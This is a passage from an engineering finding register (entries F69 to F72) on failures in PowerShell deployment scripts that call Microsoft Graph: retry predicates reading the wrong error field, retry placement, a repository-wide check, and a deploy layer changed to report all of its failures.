The lesson worth keeping is narrower than "be careful": **a repository-wide sweep has no
exemption for test data**, and the instinct to write a realistic-looking constant into a
fixture is exactly the instinct such a sweep is built to catch. Generate, do not commit.

---

## F69

**The retry read a field that does not carry the thing it was matching on**

- **Severity:** high ([F67](#f67)'s fix merged, deployed, and did nothing; L3 failed identically on the next run)
- **Confidence:** CONFIRMED - run 33323094630 on commit `0a9cb02`, which contains the retry, failed with the same 404 and produced no "retrying" line at all
- **Controls:** 3.1.1, 3.12.1
- **Closed by:** matching the whole error record, and matching a bare 404 on an endpoint where 404 can only mean replication
- **Status:** CLOSED

[F67](#f67) added a bounded retry around the group-membership write, tested it, mutation-tested
it three ways, and merged it. The next run failed **identically**, on the same call, with the
same status - and the transcript contained no retry message, so the loop never engaged.

The predicate matched `Request_ResourceNotFound` against `$_.Exception.Message`.
`Invoke-MgGraphRequest` does not put it there. The exception message is the terse form -
*"Response status code does not indicate success: 404 (Not Found)."* - and the JSON body
carrying the Graph error code lives in `$_.ErrorDetails.Message`. The retry was correct, the
budget was correct, the tests passed, and the condition it keyed on was never true.

**Fix:** the predicate reads `Exception.Message`, `ErrorDetails.Message` and the exception's
full string, and also treats a bare 404 as propagation - defensible here because on
`groups/{id}/members/$ref` a 404 can only mean one of the two directory objects is not
resolvable on this replica: the group id came from a create or lookup in the same run, and the
member id from users confirmed visible moments before. `ErrorDetails` is read null-safely,
because under StrictMode a property access on `$null` would turn every non-Graph failure into
a different and more confusing one.

### What this says about the method

**Every test F67 shipped passed against a mock that threw the wrong shape.** The mocks raised
exceptions whose `.Message` carried the Graph code, because that is where the author believed
it lived - so the tests confirmed the belief rather than the behaviour. Three mutations were
killed. The code still did nothing in production. **A mutation test proves a guard is load
bearing; it cannot prove the guard is wired to reality**, and mocks are exactly where a wrong
belief about an external system survives contact with a test suite.

The first replacement test had the same defect one layer in: its exception message read
*"...404 (Not Found)."*, which the widened predicate matches on its own, so the test passed
whether or not `ErrorDetails` was ever read. It mutation-SURVIVED, and only then became a test
of the field it exists to check. That is the third mock in this session caught supplying the
answer it was meant to verify ([F59](#f59), [F62](#f62), and here).

The rule this earns: **when a fix depends on the shape of an external system's error, the
mock encodes an assumption, and the assumption is the thing most likely to be wrong.** The
cheap check is to fail once for real and read the actual error record - which is what
[F58](#f58)'s streamed transcript exists to make possible, and what closed this in one run.

---

## F70

**I fixed the call that failed and left the call on the line above it**

- **Severity:** high (third consecutive run stopped at L3; the failure moved one line and the fix did not)
- **Confidence:** CONFIRMED - run 33324015966: the retry engaged exactly once on the POST, then the job died on `GET groups/{id}/members?$select=id`, an unprotected call in the same function
- **Controls:** 3.1.1, 3.12.1
- **Closed by:** moving the retry into `Invoke-GraphApi`, the choke point every Graph call already routes through
- **Status:** CLOSED

[F67](#f67) added a retry to the membership POST. [F69](#f69) made that retry actually fire.
The next run got one retry message - proof the machinery finally worked - and then failed on
the **GET immediately above it**, reading the group's existing members before adding any.
Same function. Adjacent line. Same freshly created group, same 404, no protection.

And it would have been the next call after that. **Every read or write against an object this
script just created can 404 on a replica that has not caught up**, and there is no principled
way to enumerate in advance which ones will.

**Fix.** The retry lives in `Invoke-GraphApi`, whose own summary already describes it as the
*"single choke point for every Microsoft Graph call"* - the retry now makes that true rather
than aspirational. `-AllowNotFound` short-circuits before it, because a caller asking *does
this exist?* wants the answer no immediately and must never wait out a propagation budget:
that is the entire difference between **not there** and **not there yet**. The budget is
script-scoped rather than threaded through every caller, because a parameter that every call
site must remember is a parameter some call site will forget - which is the shape of this
finding.

### What this says about the method

**This is the third time in one session I have fixed what the error named rather than what it
implied**, after [F49](#f49) (one test directory of three), [F54](#f54) (one scope of two) and
[F55](#f55) (two policy modules of six) had already established the pattern, and after I wrote
it into [F58](#f58) as a lesson. Knowing the failure mode by name did not prevent committing
it three more times.

What actually breaks the cycle is not vigilance, it is **placement**: a fix at the call site
protects one call, and a fix at the choke point protects the class. The code had already
identified its own choke point in a comment. The repair belonged there from the start, and
the reason it went elsewhere is that a specific failing line is concrete and a class of calls
is abstract - the concrete thing is easier to fix and is almost never the whole fix.

The three tests that covered F67 also had to be rewritten here, because they mocked
`Invoke-GraphApi` - which is now the unit under test. A mock placed at the layer you later
move the logic into stops testing anything, silently. That is the fourth mock this session
caught certifying its own assumptions ([F59](#f59), [F62](#f62), [F69](#f69), and now this).

---

## F71

**Two predicates were correct only by luck, and a sweep found them in a second**

- **Severity:** medium (both worked, both would have stopped working on a message-format change; neither had been exercised in the failing direction)
- **Confidence:** CONFIRMED - found by `verification/tests/failure-classes.Tests.ps1` on its first run, at `verification/MlsAudit.psm1:1185` and `infra/entra/teardown.ps1:131`
- **Controls:** 3.12.1, 3.12.3
- **Closed by:** both predicates now read the whole error record
- **Status:** CLOSED

[F69](#f69) cost a deploy to learn that a Graph error's CODE lives in `$_.ErrorDetails.Message`
while `$_.Exception.Message` carries only the terse status. Encoding that as a repository-wide
check took ten minutes and immediately found two more instances:

- **`MlsAudit.psm1`** - [F57](#f57)'s "a permission failure is Final" predicate, matching
  `AuthorizationFailed|403|...` against `Exception.Message`. It works, because the terse text
  happens to contain `403`. It would have missed `Authorization_RequestDenied` outright.
- **`entra/teardown.ps1`** - the `-AllowNotFound` predicate that lets a delete treat an
  already-absent object as success. Same luck, same fragility: one message-format change from
  turning "already deleted" back into a hard failure during teardown.

Both now read `Exception.Message` and `ErrorDetails.Message` together.

### What this says about the method

**Neither was found by failing.** They were found by turning a class already paid for into a
check, and pointing it at the whole repository. That is the difference between a finding
register and a test suite: the register records what went wrong once, and the suite prevents
the same shape everywhere else.

The sweep also caught its own first version being wrong: the check "this transport retries"
passed for `fabric-api.psm1` on the strength of a COMMENT mentioning `Retry-After`. A check
satisfied by prose *about* the thing it checks for is the same defect it exists to catch, one
level up - so it now strips comments before matching.

And it corrected a claim made from a partial reading: `Invoke-FabricApi` was reported here as
having no retry at all, on the strength of inspecting the first fifty lines of one function.
It has a long-running-operation poller with a deadline and `Retry-After` handling fifty lines
further down. **The transport still does not retry a transient 429**, which may or may not
matter, and the honest entry in the inventory says exactly that rather than guessing - because
guessing about an unexercised layer is how three consecutive wrong theories about L3 shipped.

---

## F72

**A layer that stops at its first error makes the discovery rate equal to the deploy rate**

- **Severity:** high (process, not code: three consecutive ~40-minute runs each returned exactly one finding)
- **Confidence:** CONFIRMED - runs 33321360624, 33323094630 and 33324015966 each failed at L3's first failing item and revealed nothing about the items behind it
- **Controls:** 3.12.1 (assess controls periodically)
- **Closed by:** collecting failures across manifest items and reporting them together, while still failing the layer
- **Status:** CLOSED

L3 halts on the first failing item. Each attempt therefore bought exactly one fact, at roughly
forty minutes per fact once deploy, analysis, review and merge are counted - and the estate has
eleven layers. The sponsor's observation that two days had produced two layers was not a
complaint about defect count; it was an accurate reading of a throughput problem.

**The defects were never the bottleneck. The serialisation was.**

`apply-entra.ps1` now runs each manifest item through `Invoke-ManifestItem`, which records a
failure and continues. Items are independent by construction - one user, one group, one app
registration - so continuing past one cannot corrupt the next. The single real dependency,
groups referencing user ids, degrades exactly as the `-WhatIf` path already did: a user that
failed has no id, and that member is reported unresolvable.

**The gate is unchanged, and that is the property the tests hold.** Collected failures are
still failures: they are listed together and the run still throws, so the layer is still red
and L4-L8 still skip. What changes is only how much a single attempt teaches. Mutation tested
in both directions - swallowing the failures, and aborting on the first.

### What this says about the method

Fail-fast is the right default for a deploy that must not proceed in a broken state, and this
layer still does not proceed. But fail-fast on DIAGNOSIS is a different property that came
along for free with it, and nobody chose it. **A run is an expensive, rate-limited
observation; it should return everything it saw.**

The general form, worth applying to L4-L8 before they run rather than after: any step that
iterates over independent items should report on all of them. The cost of getting this wrong
is invisible in a green run and compounds in a red one - which is why it survived to be found
by a human noticing that two days had produced two layers, rather than by any check here.
